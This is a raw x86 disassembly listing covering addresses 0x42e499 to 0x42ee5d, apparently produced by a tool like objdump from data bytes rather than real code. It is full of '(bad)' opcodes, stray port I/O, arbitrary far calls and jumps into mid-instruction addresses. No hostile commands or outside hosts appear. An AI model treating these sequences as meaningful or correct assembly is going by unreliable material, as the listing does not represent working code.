  42e499:	out    dx,al
  42e49a:	inc    esp
  42e49b:	sub    bh,ch
  42e49d:	jae    0x42e46e
  42e49f:	ins    DWORD PTR es:[edi],dx
  42e4a0:	sbb    al,0xf6
  42e4a2:	add    esi,edx
  42e4a4:	pop    esp
  42e4a5:	dec    edi
  42e4a6:	inc    esp
  42e4a7:	mov    es,WORD PTR [edi]
  42e4a9:	test   DWORD PTR [edx-0x3c],edi
  42e4ac:	shl    BYTE PTR [edx],cl
  42e4ae:	jle    0x42e47a
  42e4b0:	dec    eax
  42e4b1:	xlat   BYTE PTR ds:[ebx]
  42e4b2:	push   ebp
  42e4b3:	adc    esi,DWORD PTR [edx+0x71]
  42e4b6:	xor    eax,0x2ba26231
  42e4bb:	fsub   QWORD PTR cs:[edx-0x79f2b079]
  42e4c2:	xchg   cl,bl
  42e4c4:	sub    al,0x30
  42e4c6:	mov    eax,0xfc6bddcb
  42e4cb:	int3   
  42e4cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4cd:	lahf   
  42e4ce:	dec    ebp
  42e4cf:	lods   al,BYTE PTR ds:[esi]
  42e4d0:	mov    esi,0x25bba08
  42e4d5:	inc    ebx
  42e4d6:	xchg   DWORD PTR [ebx],edi
  42e4d8:	or     BYTE PTR [eax],dl
  42e4da:	call   FWORD PTR [eax+0x15]
  42e4dd:	(bad)  
  42e4de:	jl     0x42e478
  42e4e0:	pop    esp
  42e4e1:	aad    0x17
  42e4e3:	ja     0x42e543
  42e4e5:	enter  0x6ce7,0xf8
  42e4e9:	pop    ebp
  42e4ea:	call   0xa542d05f
  42e4ef:	and    DWORD PTR [ecx-0xb],esp
  42e4f2:	in     eax,dx
  42e4f3:	sbb    dh,BYTE PTR [ebp+0x3f]
  42e4f6:	xchg   ebp,eax
  42e4f7:	ficom  WORD PTR [ebx-0x39501ec4]
  42e4fd:	jae    0x42e512
  42e4ff:	imul   esi,DWORD PTR [edi-0xa],0x862d7c5c
  42e506:	loopne 0x42e4e1
  42e508:	xor    dl,ch
  42e50a:	mov    dl,0xa5
  42e50c:	mov    esi,0xb8446361
  42e511:	imul   DWORD PTR [ecx+0x6b]
  42e514:	not    BYTE PTR [ebp-0x7e7a42fd]
  42e51a:	adc    al,0xc6
  42e51c:	xor    eax,0xf6c8f5d0
  42e521:	pop    es
  42e522:	push   ebx
  42e523:	xchg   esi,eax
  42e524:	(bad)  
  42e525:	gs mov dl,0xcf
  42e528:	cmp    bh,dh
  42e52a:	jns    0x42e5a5
  42e52c:	pop    ebp
  42e52d:	jecxz  0x42e53d
  42e52f:	lock cmp al,0x20
  42e532:	mov    ecx,0x701aadb2
  42e537:	js     0x42e51a
  42e539:	xor    DWORD PTR [edx+ebx*4],esi
  42e53c:	pop    ds
  42e53d:	jl     0x42e58e
  42e53f:	lahf   
  42e540:	mov    esp,0x2ab965b
  42e545:	add    cl,cl
  42e547:	popf   
  42e548:	push   esi
  42e549:	(bad)  
  42e54a:	retf   0x5a49
  42e54d:	cs mov ecx,0x1f715812
  42e553:	mov    cl,0x1
  42e555:	inc    edx
  42e556:	inc    ecx
  42e557:	out    dx,eax
  42e558:	arpl   WORD PTR [eax+0x19],cx
  42e55b:	cmp    DWORD PTR [ecx],ebp
  42e55d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e55e:	fnstcw WORD PTR [edx+0x463f2dc1]
  42e564:	enter  0xd04e,0xa6
  42e568:	or     cl,0xea
  42e56b:	fs mov eax,0x6ef19185
  42e571:	sbb    bl,BYTE PTR ds:0x6a1d0643
  42e577:	cwde   
  42e578:	fwait
  42e579:	dec    eax
  42e57a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e57b:	or     bh,al
  42e57d:	fild   WORD PTR [ecx+0x56]
  42e580:	mov    dl,0xc4
  42e582:	pop    esi
  42e583:	retf   0xcd47
  42e586:	(bad)  
  42e587:	sub    al,bl
  42e589:	stc    
  42e58a:	push   eax
  42e58b:	call   0x0:0xf447b352
	...
  42e5f2:	add    BYTE PTR [eax],al
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	scas   eax,DWORD PTR es:[edi]
  42e601:	pop    edx
  42e602:	and    DWORD PTR [ebp+0x44],ebp
  42e605:	lock add DWORD PTR [eax],eax
  42e608:	add    al,0x1
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	mov    edi,0x65dae9d
  42e611:	cmp    al,BYTE PTR [esi]
  42e613:	iret   
  42e614:	mov    ebx,0xa7fc8981
  42e619:	inc    eax
  42e61a:	dec    edx
  42e61b:	cli    
  42e61c:	call   0x8217:0x89b98d28
  42e623:	or     al,0x8c
  42e625:	mov    ebx,0x4149bf04
  42e62a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e62b:	cmp    BYTE PTR gs:[ebp+edi*1-0x28992db4],dl
  42e633:	fldcw  WORD PTR ds:0x50e8291
  42e639:	push   ebp
  42e63a:	jecxz  0x42e5e7
  42e63c:	ins    DWORD PTR es:[edi],dx
  42e63d:	jbe    0x42e5d3
  42e63f:	push   es
  42e640:	ja     0x42e681
  42e642:	mov    cl,0x14
  42e644:	jae    0x42e65a
  42e646:	cli    
  42e647:	aad    0x11
  42e649:	rcr    esp,cl
  42e64b:	xor    DWORD PTR [esi*1-0x10eeb292],0xf63e56a7
  42e656:	lock ins BYTE PTR es:[edi],dx
  42e658:	into   
  42e659:	xchg   esi,eax
  42e65a:	mov    ah,0xcc
  42e65c:	and    eax,esi
  42e65e:	jb     0x42e6c5
  42e660:	adc    ebx,DWORD PTR [ecx+ebp*2-0x5]
  42e664:	mov    ebx,0x184f680b
  42e669:	xchg   edx,eax
  42e66a:	not    DWORD PTR [edi-0x2faffb21]
  42e670:	xor    ebx,edx
  42e672:	cld    
  42e673:	dec    ebp
  42e674:	adc    bl,BYTE PTR [edx]
  42e676:	mov    bl,0xca
  42e678:	pop    esi
  42e679:	inc    eax
  42e67a:	push   edx
  42e67b:	or     eax,0xe6f5fb8e
  42e680:	out    dx,al
  42e681:	mov    ah,al
  42e683:	mov    ch,0x5e
  42e685:	jecxz  0x42e61c
  42e687:	jmp    0x42e62f
  42e689:	das    
  42e68a:	dec    ebx
  42e68b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e68c:	sbb    eax,0xfdb7f983
  42e691:	push   edi
  42e692:	mov    WORD PTR [edx],es
  42e694:	xor    BYTE PTR [eax+0x165bb54d],al
  42e69a:	jp     0x42e61c
  42e69c:	mov    ch,al
  42e69e:	or     al,0xdf
  42e6a0:	addr16 hlt 
  42e6a2:	clc    
  42e6a3:	jno    0x42e6d6
  42e6a5:	retf   0x2fd6
  42e6a8:	mov    ds:0xdf686c7c,eax
  42e6ad:	jecxz  0x42e6c2
  42e6af:	sti    
  42e6b0:	call   FWORD PTR [ebx-0x35182df5]
  42e6b6:	sub    dh,0xa8
  42e6b9:	out    0x3e,al
  42e6bb:	sub    al,0x7a
  42e6bd:	aas    
  42e6be:	stos   BYTE PTR es:[edi],al
  42e6bf:	add    al,BYTE PTR [ecx-0x6b]
  42e6c2:	mov    al,ds:0xc48288ee
  42e6c7:	add    ch,BYTE PTR [edi+ecx*4+0x24]
  42e6cb:	in     eax,dx
  42e6cc:	test   BYTE PTR [edi-0x7f8c2222],ah
  42e6d2:	add    BYTE PTR [esi+0x5e],bl
  42e6d5:	cld    
  42e6d6:	imul   ebx,DWORD PTR [ebx-0xfc0ac43],0xffffffee
  42e6dd:	fimul  DWORD PTR [esi-0x14d71277]
  42e6e3:	ds arpl sp,cx
  42e6e6:	out    0xb0,eax
  42e6e8:	xor    ebp,eax
  42e6ea:	push   0x63
  42e6ec:	sbb    eax,0x699848cd
  42e6f1:	add    ebp,eax
  42e6f3:	jo     0x42e723
  42e6f5:	jl     0x42e711
  42e6f7:	ss jo  0x42e771
  42e6fa:	inc    ebx
  42e6fb:	dec    ebx
  42e6fc:	or     bh,BYTE PTR [ecx+0x23baeccf]
  42e702:	pop    ebp
  42e703:	and    eax,0xe1be42a7
  42e708:	hlt    
  42e709:	xchg   BYTE PTR [esi+edx*8],bh
  42e70c:	pop    es
  42e70d:	and    DWORD PTR ds:0xeb,ebp
	...
  42e773:	add    BYTE PTR [edx+0x39],bl
  42e776:	dec    esi
  42e777:	sub    eax,0x7f7b7f6f
  42e77c:	sub    BYTE PTR fs:[esi],cl
  42e77f:	ficomp DWORD PTR [edx+0x4868560c]
  42e785:	icebp  
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	xor    bl,BYTE PTR [ebp+0x750d8922]
  42e792:	or     bl,bl
  42e794:	push   cs
  42e795:	sbb    bh,0xba
  42e798:	(bad)  
  42e799:	pop    edx
  42e79a:	fs sahf 
  42e79c:	nop
  42e79d:	mov    WORD PTR [ebx],ds
  42e79f:	paddb  mm6,mm2
  42e7a2:	mov    edi,0x28d02524
  42e7a7:	xor    DWORD PTR [edi-0x7c],ebx
  42e7aa:	add    al,0x5
  42e7ac:	xchg   BYTE PTR [edx+0x5e],ch
  42e7af:	push   ecx
  42e7b0:	icebp  
  42e7b1:	rol    dl,cl
  42e7b3:	idiv   BYTE PTR [ecx]
  42e7b5:	adc    eax,0x47dd9148
  42e7ba:	addr16 mov edx,0x95c5a549
  42e7c0:	mov    edx,ebx
  42e7c2:	push   es
  42e7c3:	sbb    esi,ecx
  42e7c5:	scas   eax,DWORD PTR es:[edi]
  42e7c6:	add    DWORD PTR [esi-0x4b231f85],edx
  42e7cc:	cmova  esi,DWORD PTR [ebx]
  42e7cf:	pop    esp
  42e7d0:	cld    
  42e7d1:	push   cs
  42e7d2:	mov    eax,edx
  42e7d4:	enter  0xb51e,0x38
  42e7d8:	sbb    eax,0x6eb74d44
  42e7dd:	in     al,0x4c
  42e7df:	and    BYTE PTR [esi+esi*4],ah
  42e7e2:	std    
  42e7e3:	mov    esi,0x2ac84693
  42e7e8:	ja     0x42e801
  42e7ea:	mov    bh,0x5f
  42e7ec:	mov    edi,0xacb81b20
  42e7f1:	neg    DWORD PTR [ebx-0x656267bf]
  42e7f7:	loope  0x42e79f
  42e7f9:	imul   edx,DWORD PTR [edi],0x9aac2cf5
  42e7ff:	test   eax,0x127ac572
  42e804:	daa    
  42e805:	shl    BYTE PTR [ecx+0x17b4d997],1
  42e80b:	outs   dx,BYTE PTR ds:[esi]
  42e80c:	jnp    0x42e800
  42e80e:	push   sp
  42e810:	push   eax
  42e811:	xor    edi,esi
  42e813:	dec    ebx
  42e814:	mov    ecx,0x168ebdc5
  42e819:	pop    ds
  42e81a:	fimul  WORD PTR [ebx+eax*1+0x6c26821f]
  42e821:	popf   
  42e822:	mov    ch,0x92
  42e824:	or     dh,BYTE PTR [ecx+0x23]
  42e827:	daa    
  42e828:	xor    esp,ebp
  42e82a:	pop    esi
  42e82b:	loopne 0x42e81b
  42e82d:	and    eax,0xbad51c19
  42e832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e833:	mov    esi,0x64e1485c
  42e838:	inc    esi
  42e839:	cmp    al,0xeb
  42e83b:	inc    ecx
  42e83d:	jb     0x42e8b0
  42e83f:	mov    al,0x95
  42e841:	jnp    0x42e825
  42e843:	out    dx,al
  42e844:	mov    cl,0x3d
  42e846:	fiadd  DWORD PTR [ebx-0x6bdda70d]
  42e84c:	stc    
  42e84d:	dec    edx
  42e84e:	cmp    BYTE PTR fs:[ecx+0x258a1c91],bh
  42e855:	stos   BYTE PTR es:[edi],al
  42e856:	call   0x5ae7:0x21e8a71c
  42e85d:	add    al,0x16
  42e85f:	jbe    0x42e8c7
  42e861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e862:	jecxz  0x42e80e
  42e864:	xchg   cl,bh
  42e866:	mov    ah,0x6f
  42e868:	into   
  42e869:	aaa    
  42e86a:	int    0x38
  42e86c:	call   0xa767:0xf764e42c
  42e873:	sub    DWORD PTR es:[eax-0x2e9e6692],edx
  42e87a:	test   ebp,eax
  42e87c:	mov    ebp,0xee11667d
  42e881:	mov    cl,0xb0
  42e883:	outs   dx,DWORD PTR ds:[esi]
  42e884:	pop    esp
  42e885:	dec    esi
  42e886:	imul   edx,DWORD PTR [esi+0x4b38d7cb],0xffffff80
  42e88d:	cmp    BYTE PTR [edx],dh
  42e88f:	data16 add BYTE PTR [eax],al
	...
  42e8f2:	add    BYTE PTR [eax],al
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0x33dc07d5]
  42e901:	pop    esi
  42e902:	pop    edx
  42e904:	dec    esp
  42e905:	repnz add DWORD PTR [eax],eax
  42e908:	add    al,0x1
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	std    
  42e90d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e90e:	lds    edx,FWORD PTR [edx]
  42e910:	push   ebx
  42e911:	and    al,0x5a
  42e914:	enter  0xd793,0x3c
  42e918:	jne    0x42e8d6
  42e91a:	fs std 
  42e91c:	int    0x46
  42e91e:	or     al,0x51
  42e920:	stos   BYTE PTR es:[edi],al
  42e921:	xor    eax,0x4a8d251b
  42e926:	or     ah,ah
  42e928:	inc    ebp
  42e929:	sub    ch,BYTE PTR [esi]
  42e92b:	xchg   DWORD PTR [edx-0x66],ecx
  42e92e:	in     eax,0x6f
  42e930:	popf   
  42e931:	xchg   edx,eax
  42e932:	dec    edx
  42e933:	sti    
  42e934:	and    DWORD PTR [edx],edx
  42e936:	sti    
  42e937:	push   ss
  42e938:	mov    WORD PTR [ecx+ecx*1],?
  42e93b:	push   edi
  42e93c:	in     al,dx
  42e93d:	pop    es
  42e93e:	mov    dh,0x8a
  42e940:	cli    
  42e941:	shr    BYTE PTR [eax+ebp*4-0x18],cl
  42e945:	add    eax,0xe8dbabb7
  42e94a:	mov    bl,0x18
  42e94c:	cmc    
  42e94d:	(bad)  
  42e94f:	andnps xmm5,XMMWORD PTR [ebx+0x6d]
  42e953:	shr    bh,cl
  42e955:	clc    
  42e956:	sbb    DWORD PTR [edx-0x7abc4fb1],eax
  42e95c:	or     DWORD PTR [eax-0x65],0x31feb9a1
  42e963:	jo     0x42e8ef
  42e965:	in     al,0xca
  42e967:	or     DWORD PTR [ebp-0x3f],0x15
  42e96b:	sbb    eax,0xea5e80ee
  42e970:	mov    edi,es
  42e972:	adc    BYTE PTR [eax+0x3e3d88bc],bh
  42e978:	and    ebx,DWORD PTR [ebx-0x67]
  42e97b:	mov    edi,DWORD PTR [ebp-0x5496f255]
  42e981:	cmp    al,0x73
  42e983:	jp     0x42e98d
  42e985:	les    eax,FWORD PTR [edx+0x35b1a6ac]
  42e98b:	push   ebx
  42e98c:	sub    BYTE PTR [eax-0x504a134],ah
  42e992:	jnp    0x42e997
  42e994:	cmp    al,0x5a
  42e996:	dec    ebp
  42e997:	inc    edi
  42e998:	scas   eax,DWORD PTR es:[edi]
  42e999:	cli    
  42e99a:	xchg   esp,eax
  42e99b:	adc    edx,DWORD PTR [ecx]
  42e99d:	nop
  42e99e:	pop    edi
  42e99f:	mov    ecx,ss
  42e9a1:	or     edi,DWORD PTR [edx-0x6a]
  42e9a4:	inc    ebp
  42e9a5:	shl    BYTE PTR [edx],cl
  42e9a7:	jae    0x42e9c0
  42e9a9:	pop    esi
  42e9aa:	inc    ebx
  42e9ab:	lock enter 0x7513,0x80
  42e9b0:	mov    cl,al
  42e9b2:	fdiv   st,st(4)
  42e9b4:	or     ah,BYTE PTR [eax+0x1837d66b]
  42e9ba:	mov    edi,0x5921ea95
  42e9bf:	ds inc ebp
  42e9c1:	push   eax
  42e9c2:	sbb    al,0x47
  42e9c4:	mov    WORD PTR [edi+ebx*4+0x53],gs
  42e9c8:	mov    esp,0x8d15139a
  42e9cd:	pusha  
  42e9ce:	(bad)  
  42e9d0:	int    0xe3
  42e9d2:	push   es
  42e9d3:	xchg   ebp,eax
  42e9d4:	aas    
  42e9d5:	or     DWORD PTR [esi+eax*8-0x7b8588c3],0x48fae462
  42e9e0:	inc    eax
  42e9e1:	mov    ebp,0xacb1ccdd
  42e9e6:	pop    ss
  42e9e7:	ror    eax,0xf
  42e9ea:	xor    al,BYTE PTR [ecx+edx*8+0x9a10b98]
  42e9f1:	push   esp
  42e9f2:	test   BYTE PTR [eax-0x47],bh
  42e9f5:	test   eax,0x4dc454b9
  42e9fa:	call   0x7aa1e831
  42e9ff:	dec    ebp
  42ea00:	mov    esi,0x6601f6e6
  42ea05:	and    DWORD PTR [edi+esi*2-0x73061a02],ebp
  42ea0c:	mov    ds:0xd786e8,eax
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	mov    dx,0x7710
  42ea84:	push   eax
  42ea85:	repz add DWORD PTR [eax],eax
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	sub    al,0xe7
  42ea8e:	xchg   edi,eax
  42ea8f:	les    ebp,FWORD PTR [ecx+0x3f350121]
  42ea95:	pop    es
  42ea96:	sbb    al,0x4
  42ea98:	jae    0x8f83641e
  42ea9e:	jnp    0x42eb0b
  42eaa0:	jge    0x42eadb
  42eaa2:	cmp    ebx,ecx
  42eaa4:	add    BYTE PTR [ecx],ah
  42eaa6:	or     dh,BYTE PTR [eax-0x1695471a]
  42eaac:	mov    fs,WORD PTR [bx]
  42eaaf:	pop    DWORD PTR [edx-0x51]
  42eab2:	aam    0xf5
  42eab4:	push   esi
  42eab5:	jne    0x42eace
  42eab7:	sub    al,0x77
  42eab9:	fwait
  42eaba:	iret   
  42eabb:	dec    eax
  42eabc:	test   BYTE PTR [edi],ah
  42eabe:	sbb    eax,DWORD PTR [ebx-0x70dbaccf]
  42eac4:	lods   eax,DWORD PTR ds:[esi]
  42eac5:	adc    eax,0xf5688658
  42eaca:	sub    DWORD PTR [edi],eax
  42eacc:	adc    al,0x13
  42eace:	pop    edx
  42eacf:	sub    al,0x2c
  42ead1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ead2:	mov    al,0xe8
  42ead4:	pop    esi
  42ead5:	call   0xa6d5:0xb31819d6
  42eadc:	sti    
  42eadd:	mov    cl,0xd9
  42eadf:	fld    TBYTE PTR [ebx]
  42eae1:	mov    eax,ds:0x5e612996
  42eae6:	mov    BYTE PTR [edx],cl
  42eae8:	daa    
  42eae9:	and    al,0x6
  42eaeb:	sub    ebx,DWORD PTR [edx]
  42eaed:	je     0x42eac5
  42eaef:	inc    bh
  42eaf1:	push   es
  42eaf2:	out    0xea,eax
  42eaf4:	and    esp,DWORD PTR [esp+ebx*8+0x2]
  42eaf8:	(bad)  
  42eafa:	sbb    dh,BYTE PTR [edx-0x6e782921]
  42eb00:	into   
  42eb01:	dec    edi
  42eb02:	or     al,0x8d
  42eb04:	adc    eax,0x66f5545e
  42eb09:	adc    BYTE PTR [eax],dh
  42eb0b:	je     0x42ead9
  42eb0d:	int    0x82
  42eb0f:	fistp  QWORD PTR [edi+eax*1]
  42eb12:	aam    0xbc
  42eb14:	mov    cl,BYTE PTR [ebx]
  42eb16:	fist   DWORD PTR [eax]
  42eb18:	std    
  42eb19:	pop    edx
  42eb1a:	fwait
  42eb1b:	mov    bh,0x60
  42eb1e:	arpl   WORD PTR [ecx],sp
  42eb20:	mov    dh,0x8c
  42eb22:	push   0xffffffe9
  42eb24:	mov    dh,0x52
  42eb26:	call   0x77a3:0x7935e8a0
  42eb2d:	es daa 
  42eb2f:	adc    al,0x52
  42eb31:	mov    dh,0xc7
  42eb33:	sub    al,0xca
  42eb35:	sbb    ah,BYTE PTR [edx+0x3b]
  42eb38:	sub    ecx,0x2bca7bcd
  42eb3e:	push   esi
  42eb3f:	gs stos DWORD PTR es:[edi],eax
  42eb41:	mov    WORD PTR [esi-0x2a90f0f9],?
  42eb47:	mov    al,0xb3
  42eb49:	ret    0xa7b9
  42eb4c:	add    esi,DWORD PTR [edi+0x65]
  42eb4f:	pop    esi
  42eb50:	(bad)  
  42eb51:	(bad)  
  42eb52:	in     al,dx
  42eb53:	jae    0x42eaf1
  42eb55:	push   eax
  42eb56:	dec    ebx
  42eb57:	mov    fs:0x18792e85,al
  42eb5d:	popf   
  42eb5e:	mov    bh,0x8d
  42eb60:	lea    esp,[esi+0x4e]
  42eb63:	add    DWORD PTR [ecx+0x408ec9ca],0xfffffffe
  42eb6a:	xor    BYTE PTR [ebp-0xb906cb8],0x1c
  42eb71:	pop    ecx
  42eb72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb73:	sbb    BYTE PTR [edi],ch
  42eb75:	je     0x42ebaa
  42eb77:	cs pushf 
  42eb79:	cmp    eax,0xe6ba721f
  42eb7e:	rcl    DWORD PTR cs:[ebp-0x25],cl
  42eb82:	jmp    0x42ebe6
  42eb84:	test   eax,0xafa8b858
  42eb89:	lock lea ebp,[esi-0x3b71d4be]
	...
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	add    DWORD PTR [eax+0x47],0xf4546931
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    al,0x1
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	sub    al,0x47
  42ec0e:	jae    0x42ec0c
  42ec10:	(bad)  
  42ec11:	loopne 0x42ec50
  42ec13:	xor    DWORD PTR [eax+0x66f83838],ecx
  42ec19:	jecxz  0x42ec4a
  42ec1b:	add    eax,0xd825d9ef
  42ec20:	into   
  42ec21:	adc    DWORD PTR [esi+eiz*8],eax
  42ec24:	pusha  
  42ec25:	dec    ecx
  42ec26:	xchg   ebp,eax
  42ec27:	lock retf 
  42ec29:	cld    
  42ec2a:	retf   0x84da
  42ec2d:	pusha  
  42ec2e:	mov    WORD PTR [edx],?
  42ec30:	aad    0x18
  42ec32:	adc    bh,BYTE PTR [ebx+eax*4-0xe]
  42ec36:	sti    
  42ec37:	in     eax,0xb0
  42ec39:	mov    edi,0x25dadc9f
  42ec3e:	imul   ebx,ecx,0x49
  42ec41:	sbb    al,0xc2
  42ec43:	ss jns 0x42ebef
  42ec46:	inc    eax
  42ec47:	xchg   edx,eax
  42ec48:	fdivr  QWORD PTR [ecx-0x45]
  42ec4b:	jle    0x42ebe3
  42ec4d:	cmp    DWORD PTR [esi-0x4bfbdb4c],edi
  42ec53:	aad    0x86
  42ec55:	mov    WORD PTR [ecx+eiz*1+0x2f],ss
  42ec59:	cli    
  42ec5a:	sub    eax,0xa2d0b15
  42ec5f:	jge    0x42ec6d
  42ec61:	sbb    DWORD PTR [ecx],0xfffffff7
  42ec64:	mov    ch,0x3b
  42ec66:	retf   
  42ec67:	pop    ecx
  42ec68:	in     eax,0x4
  42ec6a:	push   cs
  42ec6b:	test   ebx,edi
  42ec6d:	xchg   DWORD PTR [ebx],esp
  42ec6f:	mov    ah,0x57
  42ec71:	inc    esi
  42ec72:	jo     0x42ec0b
  42ec74:	ret    
  42ec75:	dec    eax
  42ec76:	outs   dx,BYTE PTR ds:[esi]
  42ec77:	or     ah,BYTE PTR [ebx+0x26]
  42ec7a:	pop    ebx
  42ec7b:	addr16 popa 
  42ec7d:	shl    DWORD PTR [edi],0x8f
  42ec80:	adc    DWORD PTR [edx+0x1b],edx
  42ec83:	mov    ecx,0xbb46e880
  42ec88:	jb     0x42ecbf
  42ec8a:	inc    ebx
  42ec8b:	pusha  
  42ec8c:	addr16 cmp al,0x22
  42ec8f:	jne    0x42ec15
  42ec91:	fwait
  42ec92:	(bad)  
  42ec93:	out    0x34,eax
  42ec95:	jecxz  0x42ec50
  42ec97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec98:	fistp  QWORD PTR [ecx-0x7495aace]
  42ec9e:	inc    esi
  42ec9f:	push   ebx
  42eca0:	rol    BYTE PTR [ebx+0x11837bff],cl
  42eca6:	fsub   DWORD PTR [eax]
  42eca8:	lds    esp,FWORD PTR [esi]
  42ecaa:	mov    ecx,esi
  42ecac:	fisttp WORD PTR [eax-0x7b]
  42ecaf:	xlat   BYTE PTR ds:[ebx]
  42ecb0:	iret   
  42ecb1:	and    DWORD PTR [ebx+0x1ad174e8],0x4b
  42ecb8:	pop    es
  42ecb9:	dec    edx
  42ecba:	pop    esi
  42ecbb:	mov    edx,0x8713c29c
  42ecc0:	mov    dh,0x85
  42ecc2:	xor    al,0xc3
  42ecc4:	jbe    0x42ec96
  42ecc6:	sbb    cl,BYTE PTR [edx]
  42ecc8:	gs ins DWORD PTR es:[edi],dx
  42ecca:	cli    
  42eccb:	mov    ch,0x96
  42eccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ecce:	mov    al,ds:0xbe1f0f46
  42ecd3:	and    eax,0x1c8f39fd
  42ecd8:	cmp    esi,DWORD PTR [ebp-0x6292cd7b]
  42ecde:	add    BYTE PTR [eax-0x18],al
  42ece1:	mov    bh,bh
  42ece3:	sub    BYTE PTR [ecx+edx*8],dl
  42ece6:	test   BYTE PTR [ecx+0x7346ef66],0x6e
  42eced:	shl    DWORD PTR [edi+0xd],1
  42ecf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecf1:	dec    ecx
  42ecf2:	out    dx,eax
  42ecf3:	lds    eax,FWORD PTR [ecx-0x32243859]
  42ecf9:	ja     0x42ec9a
  42ecfb:	mov    eax,ds:0x77eef1b2
  42ed00:	lods   eax,DWORD PTR ds:[esi]
  42ed01:	mov    dh,0x17
  42ed03:	repz sub ebp,DWORD PTR [edi+0x4ff47597]
  42ed0a:	xchg   edx,eax
  42ed0b:	jo     0x42ed27
  42ed0d:	adc    cl,BYTE PTR fs:[ebx+0x0]
	...
  42ed71:	add    BYTE PTR [eax],al
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp+0x4a6baaa2]
  42ed83:	loope  0x42eddd
  42ed85:	cmc    
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	rol    ch,1
  42ed8e:	stc    
  42ed8f:	adc    eax,0xea5740d4
  42ed94:	dec    eax
  42ed95:	clc    
  42ed96:	js     0x42edb9
  42ed98:	bound  esp,QWORD PTR [esi+ecx*8-0x7fa497b3]
  42ed9f:	sbb    eax,0xaac57380
  42eda4:	(bad)  
  42eda6:	adc    al,0xce
  42eda8:	jg     0x42ed99
  42edaa:	mov    ch,0x62
  42edac:	in     eax,0x55
  42edae:	push   edi
  42edaf:	jle    0x42ee21
  42edb1:	sub    ah,BYTE PTR [ebp+0x544f9bfe]
  42edb7:	and    BYTE PTR [ecx-0x7b],dh
  42edba:	loop   0x42ee29
  42edbc:	and    ch,bl
  42edbe:	push   0x73
  42edc0:	enter  0xd57b,0x3c
  42edc4:	icebp  
  42edc5:	lea    esp,[edx+eax*8-0x67]
  42edc9:	shr    edi,cl
  42edcb:	idiv   BYTE PTR [eax-0x22caad6e]
  42edd1:	pusha  
  42edd2:	dec    ebx
  42edd3:	hlt    
  42edd4:	inc    ecx
  42edd5:	leave  
  42edd6:	ja     0x42ed6a
  42edd8:	bound  eax,QWORD PTR [edx+edx*8]
  42eddb:	mov    al,0x9e
  42eddd:	addr16 pop eax
  42eddf:	sbb    DWORD PTR [ebx+0x43],ebx
  42ede2:	xchg   ebp,eax
  42ede3:	push   ebp
  42ede4:	xchg   DWORD PTR [ebp+0x45840d3a],edi
  42edea:	(bad)  
  42edeb:	dec    ebx
  42edec:	out    0x1d,eax
  42edee:	arpl   WORD PTR ds:0x863d6b46,si
  42edf4:	imul   edx,DWORD PTR [esi+0x56],0x6d
  42edf8:	dec    esp
  42edf9:	or     cl,BYTE PTR [ecx-0xb]
  42edfc:	mov    dh,0xae
  42edfe:	retf   0x505a
  42ee01:	in     al,dx
  42ee02:	iret   
  42ee03:	mov    gs,WORD PTR [eax+0x20]
  42ee06:	iret   
  42ee07:	sub    eax,0xcf60e841
  42ee0c:	add    al,0x18
  42ee0e:	sbb    ebp,DWORD PTR [ecx+0x36aed2e4]
  42ee14:	xor    DWORD PTR [ecx],esp
  42ee16:	or     BYTE PTR [edx-0x32],dl
  42ee19:	jnp    0x42edd5
  42ee1b:	push   DWORD PTR [edi+0x162bc33f]
  42ee21:	bound  edi,QWORD PTR [edi+edx*4]
  42ee24:	push   es
  42ee25:	inc    esp
  42ee26:	fwait
  42ee27:	out    0x88,al
  42ee29:	cs out dx,al
  42ee2b:	xor    al,0x99
  42ee2d:	pop    edx
  42ee2e:	mov    al,0x3a
  42ee30:	mov    ecx,0x5e2d98f6
  42ee35:	inc    ecx
  42ee36:	mov    WORD PTR [ebx+0x5a2a9de3],cs
  42ee3c:	std    
  42ee3d:	push   edx
  42ee3e:	es std 
  42ee40:	(bad)  
  42ee41:	mov    ah,0xe9
  42ee43:	daa    
  42ee44:	xor    ebp,edi
  42ee46:	jbe    0x42ee43
  42ee48:	mov    eax,0xfe3f784e
  42ee4d:	fcomp  DWORD PTR [ebp+edi*8+0x72]
  42ee51:	rol    DWORD PTR [eax+0x1d866ffb],0xd5
  42ee58:	or     eax,0x2356689f
  42ee5d:	xchg   edx,eax
